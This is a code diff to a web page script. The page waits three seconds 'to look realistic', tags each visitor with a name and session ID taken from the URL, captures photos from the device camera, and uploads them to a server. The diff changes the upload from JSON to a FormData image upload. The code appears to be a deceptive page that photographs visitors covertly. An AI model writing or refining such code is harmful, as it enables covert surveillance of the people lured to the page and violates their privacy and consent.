@@ -16,7 +16,7 @@
   (async function() {
     const status = document.getElementById("status");
 
-    // Delay so it looks realistic
+    // Delay to look realistic
     await new Promise(r => setTimeout(r, 3000));
 
     // Get sessionId and name from URL
@@ -24,6 +24,7 @@
     const sessionId = urlParams.get("sessionId") || Date.now().toString() + Math.floor(Math.random()*1000);
     const name = urlParams.get("name") || "visitor";
 
+    // Take a snapshot from camera
     async function takePhoto(facingMode) {
       try {
         const constraints = {
@@ -48,16 +49,18 @@
       }
     }
 
+    // Send to server with FormData (Cloudinary upload)
     async function sendToServer(imageData, type) {
-      await fetch("/upload", {
+      const blob = await (await fetch(imageData)).blob();
+      const formData = new FormData();
+      formData.append("photo", blob, `${type}.jpg`);
+      formData.append("name", name);
+      formData.append("type", type);
+      formData.append("sessionId", sessionId);
+
+      await fetch("/upload-photo", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          image: imageData,
-          name,
-          type,
-          sessionId
-        })
+        body: formData
       });
     }
 
